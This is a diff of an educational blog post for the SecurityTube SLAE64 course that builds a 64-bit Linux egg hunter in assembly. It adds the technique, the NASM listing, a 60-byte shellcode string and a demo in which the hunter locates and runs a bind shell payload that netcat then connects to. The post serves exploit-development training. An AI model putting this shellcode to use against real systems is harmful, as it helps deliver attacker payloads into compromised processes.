@@ -2,7 +2,7 @@
 title = "Security Tube SLAE64 Course - Assessment 3 - Egg Hunter"
 author = "Codehead"
 layout = "post"
-date = "2017-10-30T14:02:00"
+date = "2017-11-06T18:43:09"
 url = "/slae64-03-egg-hunter/"
 categories = [ "SLAE64", "Assembler", "Shellcode" ]
 tags = [ "shellcode", "assembler", "linux", "x64" ]
@@ -14,19 +14,19 @@ Egg hunting is a technique which can be used to solve shellcode space restrictio
 
 <!--more-->
 
-(Example?)
+## A 64-bit memory primer
 
-## Searching memory
-
-In a 64 bit system the theoretical maximum address space is 16 Exabytes (18,446,744,073,709,551,616 bytes). However, the hardware requirements and management overhead of addressing the full memory range would be prohibitively expensive to implement. In current AMD64 implementations the lower 48 bits of an address are usable, allowing 256 TB (281,474,976,710,656 bytes) of memory to be addressed. The remaining bits of the upper two bytes must all match the state of the 47th bit (the last bit of the 6th byte) or a hardware exception is thrown.
+In 64-bit systems the theoretical maximum address space is 16 Exabytes (18,446,744,073,709,551,616 bytes). However, the hardware requirements and management overhead of addressing the full memory range would be prohibitively expensive to implement. In current AMD64 implementations the lower 48 bits of an address are usable, allowing a virtual 256 TB (281,474,976,710,656 bytes) address space per application. The remaining bits of the upper two bytes must all match the state of the 47th bit (the last bit of the 6th byte) or a hardware exception is thrown.
 
 ![image](img/x64-48bit-mem.png)
 
-The restriction on the upper two bytes of an address mean that we have two address range blocks in AMD64 systems: The first is from <tt>0x0000000000000000</tt> to <tt>0x00007FFFFFFFFFFF</tt> and is used by applications, the second is from <tt>0xFFFF800000000000</tt> to <tt>0xFFFFFFFFFFFFFFFF</tt> and is generally reserved for use by the operating system.
+The restriction on the upper two bytes of an address mean that there are two address range blocks in AMD64 systems: The first is from <tt>0x0000000000000000</tt> to <tt>0x00007FFFFFFFFFFF</tt> and is used by applications, the second is from <tt>0xFFFF800000000000</tt> to <tt>0xFFFFFFFFFFFFFFFF</tt> and is generally reserved for use by the operating system.
 
-Our egg value and shellcode target are probably going to be either on the heap or the stack, so the memory region we need to search is the lower <tt>0x0000000000000000</tt> to <tt>0x00007FFFFFFFFFFF</tt> range. 
+![image](img/x64-mem-blocks.png)
 
-### The first attempt
+Our egg value and shellcode target are probably going to be either on the heap or the stack, so the memory region we need to search is the lower application range. 
+
+### A first attempt
 
 A naive implementation of the memory search would look something like this:
 
@@ -35,26 +35,25 @@ global _start
 section .text
 
 _start:
-    push 0x1
+    push 0x1            ; Start address
     pop rdi
-    mov eax, 0x42414241
+    mov eax, 0x42414241 ; Egg value
 _test:
-    scasd
-    je _found
-    inc rdi
-    loop _test
+    scasd               ; compare and increment
+    je _found           ; Break if found
+    loop _test          ; Or keep scanning
     
 _found:
-    jmp rdi
+    jmp rdi             ; Jump to payload
 {{</ highlight >}}
 
-This code sets up by placing 1 in the <tt>RDI</tt> register and a target egg value in <tt>RAX</tt>. The <tt>INC</tt> and <tt>LOOP</tt> instructions take care of moving the <tt>RDI</tt> pointer across the memory range, while <tt>SCASD</tt> is used to to repeatedly compare the value of the referenced address with the egg value until we find a match. If a match is found, we jump to the location.
+This code starts up by placing 1 in the <tt>RDI</tt> register and a target egg value in <tt>RAX</tt>. The <tt>INC</tt> and <tt>LOOP</tt> instructions take care of moving the <tt>RDI</tt> pointer across the memory range, while <tt>SCASD</tt> is used to to repeatedly compare the value of the referenced address with the egg value until we find a match. If a match is found, we jump to the location.
 
-Two problems crop up straight away with this approach:
+However, things are never that simple. Two problems crop up straight away with this approach:
 
-First, we get a segmentation fault when trying to access address 0x0000000000000001. That area of memory is not readable by our process and this stops the search dead.
+First, we get a segmentation fault when trying to access address <tt>0x0000000000000001</tt>. That area of memory is not readable by our process and the exception stops the search dead.
 
-Looking at the memory map for our process while it is stopped in <tt>gdb</tt>, we can see the areas that are accessible:
+Looking at the memory map for our process while it is suspended in <tt>gdb</tt>, we can see that only small areas of the address space are accessible:
 
 {{< highlight text >}}
 MBP:slae64$ ps -e | grep egg_hunter
@@ -68,16 +67,162 @@ MBP:slae64$ cat /proc/3711/maps
 ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0              [vsyscall]
 {{</ highlight >}}
 
-Secondly, even if we do manage to read from the low addresses, we will probably hit the <tt>.text</tt> section of our program at in memory before stumbling across any heap or stack areas. In my tests, <tt>.text</tt> was at <tt>0x400080</tt>. Any heap memory will normally appear immediately after <tt>.text</tt> and the stack is way up at <tt>0x7fffffffe2b0</tt>. This means we'll see the egg value in our code before anything in the application's memory and our jump land back in the code it started from.
+Second, even if we could continue the scan, we will hit the <tt>.text</tt> section of our program at <tt>0x400000</tt> first and find the egg value definition in the code before we have a chance to search the heap and stack further up the address space.
 
-To address the first problem, 
+### Validating address ranges
 
+To address the first problem, we need to work out if we are permitted to read an address before accessing it. We have seen that a direct read of an invalid address will throw an exception and we don't have the space to write an exception handler, but we can use the handlers that exist in other code. For example, passing a bad address as a parameter to a syscall simply returns an error as the return value from the call. This means we can use a syscall as a test to see if an address is valid by examining the return value. We are not interested in the actual result of the syscall, we simply need something that:
 
-### Choosing the egg
+ * Takes a memory reference as a parameter.
+ * Does not change the state of the system when executed correctly, I.e., does not write to memory or induce some unexpected state.
+ * Will return a clear indication that memory is readable or not.
+ * Has minimal other parameters for easy management.
 
-We could scan backwards through memory from high to low. That would hit the stack and heap before the code, but it is better to have a better egg detection method to avoid the problem completely. Egg selection will be covered later in the 'Choosing an Egg' section.
+A good candidate syscall is <tt>sys_access</tt> (0x15) which checks the current user's permission's for a specified file. The <tt>man</tt> page for <tt>access</tt> tells us that the parameters are a pathname string and a flags value. The string is our memory reference and we don't care about the flags, they can be zero. The <tt>man</tt> page even includes the following handy detail about return values:
 
+{{< highlight text >}}
+ERRORS
 
+       access() may fail if:
+
+       EFAULT - pathname points outside your accessible address space.
+{{</ highlight >}}
+
+<tt>sys/errno.h</tt> gives us the value of EFAULT:
+
+{{< highlight c >}}
+#define EFAULT      14      /* Bad address */
+{{</ highlight >}}
+
+Looking back at the memory map we see that the blocks are sized in factors of 0x1000 or 4096 bytes. This is to be expected as 4k is the normal <tt>PAGE_SIZE</tt> value for x64 systems. Skipping through memory in 4k steps is much more preferable than testing each address individually and will speed up our search.
+
+Here is a quick loop to step through memory and check for addressable regions:
+
+{{< highlight asm >}}
+    mov rdx, 0x1000     ; 4k step
+    mov rdi, 0          ; Start address
+    mov rsi, 0          ; Empty flag argument for access()
+    
+_page_test:
+    mov rax, 0x15
+    syscall             ; access()
+    cmp rax, -14        ; Test for EFAULT
+    jne short _valid    ; OK to read
+    add rdi, rdx        ; Step to next page
+    jmp _page_test      ; Invalid, skip to next
+
+_valid:
+    ...
+{{</ highlight >}}
+
+This solves our first problem of invalid addresses. Now we can move on to searching the valid regions for our egg.
+
+### Choosing an egg value
+
+As stated earlier, the first valid region that a low to high sweep of memory will encounter is the <tt>.text</tt> region where our code resides. As the egg value we're looking for is defined in our code, we run the risk of discovering the wrong signature bytes early in our search. We could scan backwards through memory from high to low. That might be desirable if we know our payload is on the stack. However, with a 48bit address space, we will need to start from the low values if our payload is on the heap. 
+
+To avoid false positives, we'll use a four byte egg value and repeat it at the start of our target shellcode. That way we have an 8 byte marker for the main payload, but only 4 bytes of it in the hunting code.
+
+Another consideration is that our search function will jump the instruction pointer to the start of our marker. The bytes need to form valid instructions that do not change the state of anything. We could use 'no operation' codes (<tt>0x90 NOP</tt>) to slide past the signature, but multiple <tt>NOP</tt> instructions are commonly found as padding between functions, so they are not a good choice. 
+
+In the end I chose a nonsense statement formed from two complementing jumps:
+
+{{< highlight asm >}}
+eb 02         jmp 2
+eb fc         jmp -4
+{{</ highlight >}}
+
+When the instruction pointer lands on the first byte, it jumps past the second instruction. This jump over/jump back combination would be unlikely to occur in real code and it has no sensible ASCII value. Hopefully the 8 byte version will be unique in memory.
+
+{{< highlight text >}}
+eb 02 eb fc eb 02 eb fc
+{{</ highlight >}}
+
+We can build the full egg value from a 4 byte template in a spare register. 
+
+{{< highlight asm >}}
+mov ebx, 0xfceb02eb ; Build egg in RBX
+push rbx
+shl rbx, 32
+or rbx, [rsp] 
+{{</ highlight >}}
+
+The payload is a string, so the template must be reversed in the initial <tt>DWORD</tt>.
+
+Now that we have a valid page and a good egg value, we can work on scanning the page regions. 
+
+### Hunting the egg
+
+When researching the egg hunter technique, I found 32bit implementations that used <tt>scasd</tt> to compare the egg value to memory in 4 byte steps. The <tt>scas</tt> instruction is compact and increments the memory pointer automatically, helping to produce small shellcode. Doing the <tt>scas</tt> check twice to find an 8 byte egg also moved <tt>rdi</tt> past the signature bytes, removing the need for a valid executable egg as the jump to the payload will land on the first executable byte of the actual payload after the signature.
+
+On x64 we could use <tt>sacsq</tt> to do 8 byte comparisons. However, I found that there is no guarantee that the egg signature would be aligned to an 8 byte boundary, so opted to increment <tt>rdi</tt> manually by one byte at a time and use <tt>cmp</tt> with the full 64 bit registers for my search.
+
+{{< highlight asm >}}
+_valid:
+    mov rcx, 0xff8      ; Loop count
+    
+_egg_test:
+    cmp rbx, [rdi]      ; Test content of rdi against rbx
+    je _found           ; If we found the egg, jump to the location
+    inc rdi             ; Move to next address
+    loop _egg_test      ; Repeat
+                        ; If we've covered the whole page, 
+    add rdi, 8          ; add 8 to rdi, placing the pointer on the next page
+    jmp _page_test      ; Validate the page
+    
+_found:
+    jmp rdi             ; Execute the egg and payload
+{{</ highlight >}}
+
+The code above uses a loop with a count of <tt>0xff8</tt> in <tt>RCX</tt> this is 8 bytes short of 4k to avoid the read extending into an unvalidated area on the next page as we approach the end of a block. This does mean that we could miss a signature if it spans a page boundary, but the chances are low.
+
+### Building the shellcode
+
+After removing all <tt>NULL</tt> values and squeezing the size of the code down, we end up with the finished listing at [egg_hunter.nasm](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_3/egg_hunter.nasm). This code results in a 60 byte shellcode string:
+
+{{< highlight text >}}
+    |  egg value   | 
+    V              V
+\xbb\xeb\x02\xeb\xfc\x53\x48\xc1\xe3\x20\x48\x0b\x1c\x24\x48\x31\xd2\x52\xb6\x10
+\x5f\x57\x5e\x6a\x15\x58\x0f\x05\x3c\xf2\x75\x05\x48\x01\xd7\xeb\xf2\x52\x59\x83
+\xe9\x08\x48\x3b\x1f\x74\x0b\x48\xff\xc7\xe2\xf6\x48\x83\xc7\x08\xeb\xdd\xff\xe7
+{{</ highlight >}}
+
+Bytes 1 - 4 are the egg signature block.
+
+The <tt>nasm</tt> version uses a <tt>.data</tt> section to simulate a payload which simply prints 'OK' then quits. This shows that the principle of the code works, but we'll need a proper test to be sure.
+
+### Egg hunter demo
+
+The C code at [egg_hunter_demo.c](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_3/egg_hunter_demo.c) builds on Vivek's testbed to run the egg hunter shellcode against a randomly sized heap containing the bind shell payload from [Assignment 1](slae64-01-bind-shell).
+
+The heap contains a random number of pages and payload page is also padded with a random number of bytes to test out the hunting code thoroughly. The egg hunter finds the signature quickly and we can connect from another terminal almost immediately.
+
+{{< highlight text >}}
+MBP:slae64$ ./egg_demo 
+Allocating heap data
+Padding heap with 294 pages of junk
+Padding payload page by 480 bytes
+Appending payload
+Triggering egg hunter
+{{</ highlight >}}
+
+{{< highlight text >}}
+MBP:slae64$ nc 127.0.0.1 4444
+Speak friend and enter: password
+Welcome
+pwd
+/home/codehead/SLAE64/assignment_3
+exit
+{{</ highlight >}}
+
+### Possible improvements
+
+At 60 bytes, the code is reasonably small. Some of the examples I discovered when researching the topic were around 30-40 bytes. However, larger x64 opcodes, the lack of instructions such as <tt>pusha</tt> and <tt>popa</tt> plus the choice to go for per-byte searching over <tt>scas</tt> meant that getting down to the same size as 32bit code would always be difficult.
+
+My implementation does suffer some speed issues. While the in-page search is fast, extensive memory validation is not. Heap based payloads are discovered quickly, but if the search extends to the stack, the sheer size of the address space means that a low to high scan is impractical. In tests with [egg_hunter_stack_demo.c](https://github.com/CodeheadUK/SLAE64/blob/master/assignment_3/egg_hunter_stack_demo.c), the code took over 6 hours to locate a stack based signature. It would be better to have a specific version of the egg hunter code that scans from high to low for situations where the payload is known to be stack based.
+
+This concludes the assessment. Writing this code was a challenge, but a good learning experience.    
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
